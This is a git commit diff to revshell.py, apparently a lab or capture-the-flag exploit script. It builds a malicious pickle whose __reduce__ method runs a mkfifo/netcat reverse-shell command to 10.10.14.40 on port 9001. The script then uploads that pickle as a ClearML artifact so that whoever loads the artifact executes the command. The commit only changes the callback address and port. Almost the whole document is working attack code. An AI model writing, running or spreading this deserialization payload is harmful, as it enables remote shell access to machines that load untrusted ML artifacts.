90b8acf500e8e569a7a92e3509879f03a84a9cd6
William957-web <85293841+William957-web@users.noreply.github.com>
2024-06-10 11:37:45 +0800

    Update revshell.py

--- revshell.py
+++ revshell.py
@@ -4,7 +4,7 @@ import pickle
 from clearml import Task
 class RunCommand:
     def __reduce__(self):
-        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.140 4444 >/tmp/f',))
+        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.40 9001 >/tmp/f',))
 command = RunCommand()
 task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=['review'], output_uri=True)
 task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True)
